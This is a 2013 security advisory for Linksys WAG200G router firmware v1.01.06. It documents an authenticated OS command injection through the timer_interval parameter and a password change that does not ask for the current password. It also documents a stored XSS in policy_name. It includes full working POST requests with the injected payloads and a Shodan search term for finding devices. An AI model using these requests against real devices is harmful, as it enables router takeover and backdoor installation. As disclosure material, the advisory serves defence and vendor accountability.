@@ -1,0 +1,93 @@
+Device Name: Linksys WAG200G
+Vendor: Linksys/Cisco
+
+============ Device Description: ============ 
+
+The WAG200G is a Linksys Wireless-G ADSL Home Gateway which has a high-speed ADSL2+ modem that gives you a fast connection to the Internet.
+
+Source: http://homesupport.cisco.com/en-us/support/gateways/WAG200G
+
+============  Vulnerable Firmware Releases ============ 
+
+Firmware-Version: v1.01.06
+
+============ Shodan Torks ============ 
+
+Shodan Search: WAG200G
+
+============ Vulnerability Overview: ============ 
+
+* OS Command Injection
+	=> Parameter timer_interval=`%20ping%20-c2%20192%2e168%2e178%2e104%20`
+	
+The vulnerability is caused by missing input validation in the timer_interval parameter and can be exploited to inject and execute arbitrary shell commands. It is possible to start a telnetd or upload and execute a backdoor to compromise the device.
+You need to be authenticated to the device or you have to find other methods for inserting the malicious commands.
+
+Example Exploit:
+
+POST /setup.cgi HTTP/1.1
+Host: 192.168.178.199
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.199/setup.cgi?next_file=Setup.htm
+Authorization: Basic #########
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1051
+Connection: close
+
+wan_encapmode=pppoa&wan_multiplex=llc&pppoa_multiplex=vc&wan_qostype=ubr&wan_autodetect=enable&dsl_modulation=MMODE&bridged_dhcpenable=dhcp&ipppoe_enable=0&PoeUserName=admin&PoePasswd=admin&pppoeDODC=pppoeDODC&poeIdleTime=5&hostname=test&domainname=&mtu_type=auto&lan_ip_1=192&lan_ip_2=168&lan_ip_3=178&lan_ip_4=199&lan_mask=0&lan_dhcp=disable&time_zone=%2B0+2&timer_interval=`%20ping%20192%2e168%2e178%2e104%20`&upgrade_langpkt=1&save=Save+Settings&c4_wan_ip_=&c4_wan_mask_=&c4_wan_gw_=&c4_wan_dns1_=&c4_wan_dns2_=&c4_lan_ip_=192.168.178.199&c4_dhcpserver_ip_=&c4_static_dns0_=&c4_static_dns1_=&c4_static_dns2_=&c4_wan_wins_=&h_wan_encapmode=pppoa&h_wan_multiplex=llc&h_pppoa_multiplex=vc&h_wan_qostype=ubr&h_wan_autodetect=enable&h_dsl_modulation=MMODE&h_bridged_dhcpenable=dhcp&h_pppoeDODC=pppoeDODC&h_mtu_type=auto&h_lan_mask=0&h_lan_dhcp=disable&h_time_zone=%2B0+2&h_auto_dls=disable&PppoeUserName=&PppoePasswd=&PppoaUserName=admin&PppoaPasswd=admin&h_ipppoe_enable=0&h_upgrade_langpkt=1&todo=save&this_file=Setup.htm&next_file=Setup.htm&message=
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/WAG200-os-command-injection.png
+
+* For changing the password there is no request to the current password.
+
+With this vulnerability an attacker is able to change the current password without knowing it. The attacker needs access to an authenticated browser.
+
+* Stored XSS
+
+Injecting scripts into the parameter policy_name reveals that this parameter is not properly validated for malicious input. You need to be authenticated or you have to find other methods for inserting the malicious JavaScript code.
+
+Access Restrictions -> Enter Policy Name
+	=> the script gets executed under Status -> Wireless 
+
+POST /setup.cgi HTTP/1.1
+Host: 192.168.178.199
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.199/setup.cgi?next_file=AccessRes.htm
+Authorization: Basic xxx=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 584
+
+access_policy=1&f_status1=enable&policy_name=123"><img%20src%3d"0"%20onerror%3dalert("XSSed1")>&f_status2=deny&time=settimes&starthour=0&startminute=0&endhour=0&endminute=0&save=Save+Settings&h_access_policy=1&h_f_status1=enable&h_f_status2=deny&h_alldays=disable&h_sun=disable&h_mon=disable&h_tue=disable&h_wed=disable&h_thurs=disable&h_fri=disable&h_sat=disable&h_time=settimes&h_starthour=0&h_startminute=0&h_endhour=0&h_endminute=0&h_blocked_service0=None&h_blocked_service1=None&h_svc_type0=icmp&h_svc_type1=icmp&todo=save&this_file=AccessRes.htm&next_file=AccessRes.htm&message=
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/WAG200-stored-xss-access-restrictions.png
+
+============ Solution ============
+
+No known solution available.
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de
+Advisory URL: http://www.s3cur1ty.de/m1adv2013-016
+Twitter: @s3cur1ty_de
+
+============ Time Line: ============
+
+October 2012 - discovered vulnerability
+16.10.2012 - contacted Linksys and give them detailed vulnerability details
+16.10.2012 - Linksys responded with case number
+13.11.2012 - /me requested update of the progress
+15.11.2012 - Case closed
+08.02.2013 - public release
+
+===================== Advisory end =====================
